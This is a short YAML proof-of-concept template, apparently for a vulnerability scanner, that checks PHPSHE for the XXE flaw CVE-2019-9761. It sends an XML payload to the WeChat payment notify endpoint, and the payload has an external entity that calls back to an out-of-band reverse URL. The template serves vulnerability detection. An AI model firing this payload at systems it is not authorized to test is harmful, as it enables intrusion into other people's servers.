name: poc-yaml-phpshe-cve-2019-9761-xxe
binding: c2b9076b-36af-4242-9d94-12de9196caba
manual: true
detail:
    author: N0oneeeee
    links:
        - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9761
    vulnerability:
        id: CT-105203
        level: high
transport: http
set:
    rand: randomInt(200000000, 210000000)
    reverse: newReverse()
    reverseURL: reverse.url
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /include/plugin/payment/wechat/notify_url.php
            headers:
                Content-Type: application/xml
            body: <?xml version="1.0" encoding="utf-8"?><!DOCTYPE root [<!ENTITY %xxe SYSTEM "http://{{reverseURL}}/{{rand}}">%xxe;]>
        expression: reverse.wait(5)
expression: r0()
